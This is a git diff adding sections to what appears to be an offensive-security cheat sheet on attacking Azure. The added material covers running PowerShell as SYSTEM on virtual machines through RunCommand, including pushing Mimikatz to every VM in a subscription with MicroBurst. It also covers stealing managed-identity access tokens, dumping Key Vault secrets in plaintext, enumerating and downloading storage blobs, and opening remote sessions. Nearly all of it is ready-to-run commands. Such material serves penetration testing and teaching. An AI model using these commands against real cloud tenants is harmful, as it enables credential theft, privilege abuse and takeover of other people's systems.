@@ -1,6 +1,52 @@
 # Azure Services
 
-## Azure Runbook
+## Virtual Machine
+
+### RunCommand
+
+> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as `NT Authority\System`
+
+**Requirements**: 
+* `Microsoft.Compute/virtualMachines/runCommand/action`
+
+* List available Virtual Machines
+    ```powershell
+    PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
+    ResourceGroupName    Name       
+    -----------------    ----       
+    TESTRESOURCES        Remote-Test
+    ```
+
+* Get Public IP of VM by querying the network interface
+    ```powershell
+    PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
+    PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
+    PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>
+    ```
+
+* Execute Powershell script on the VM, like `adduser`
+    ```ps1
+    PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
+    PS Azure C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
+    ```
+
+* Finally you should be able to connect via WinRM
+    ```ps1
+    $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+    $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
+    $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+    Enter-PSSession $sess
+    ```
+
+Against the whole subscription using `MicroBurst.ps1`
+
+```powershell
+Import-module MicroBurst.psm1
+Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
+```
+
+
+## Runbook
 
 Runbook must be **SAVED** and **PUBLISHED** before running it.
 
@@ -41,7 +87,7 @@ Runbook must be **SAVED** and **PUBLISHED** before running it.
     ```
 
 
-## Azure Service Principal
+## Service Principal
 
 * Generate a new service principal password/secret
     ```ps1
@@ -56,6 +102,75 @@ Runbook must be **SAVED** and **PUBLISHED** before running it.
     }
     Add-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipalId -BodyParameter $params
     ```
+
+
+## KeyVault
+
+* Keyvault access token
+    ```powershell
+    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
+    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
+    ```
+
+* Connect with the access token
+    ```ps1
+    PS> $token = 'eyJ0..'
+    PS> $keyvaulttoken = 'eyJ0..'
+    PS> $accid = '2e...bc'
+    PS Az> Connect-AzAccount -AccessToken $token -AccountId $accid -KeyVaultAccessToken $keyvaulttoken
+    ```
+
+* Query the vault and the secrets
+    ```ps1
+    PS Az> Get-AzKeyVault
+    PS Az> Get-AzKeyVaultSecret -VaultName <VaultName>
+    PS Az> Get-AzKeyVaultSecret -VaultName <VaultName> -Name Reader -AsPlainText
+    ```
+
+
+## Azure Storage Blob
+
+* Blobs - `*.blob.core.windows.net`
+* File Services - `*.file.core.windows.net`
+* Data Tables - `*.table.core.windows.net`
+* Queues - `*.queue.core.windows.net`
+
+### Enumerate blobs
+
+```powershell
+PS > . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureBlobs.ps1
+PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt
+Found Storage Account -  redacted.blob.core.windows.net
+```
+
+### List and download blobs
+
+```powershell
+PS Az> Get-AzResource
+PS Az> Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
+PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context
+PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
+```
+
+### SAS URL
+
+* Use [Storage Explorer](https://azure.microsoft.com/en-us/features/storage-explorer/)
+* Click on **Open Connect Dialog** in the left menu. 
+* Select **Blob container**. 
+* On the **Select Authentication Method** page
+    * Select **Shared access signature (SAS)** and click on Next
+    * Copy the URL in **Blob container SAS URL** field.
+
+:warning: You can also use `subscription`(username/password) to access storage resources such as blobs and files.
+
+
+## Azure Web App
+
+### SSH Connection
+
+```powershell
+az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME>
+```
 
 
 ## Azure Devops
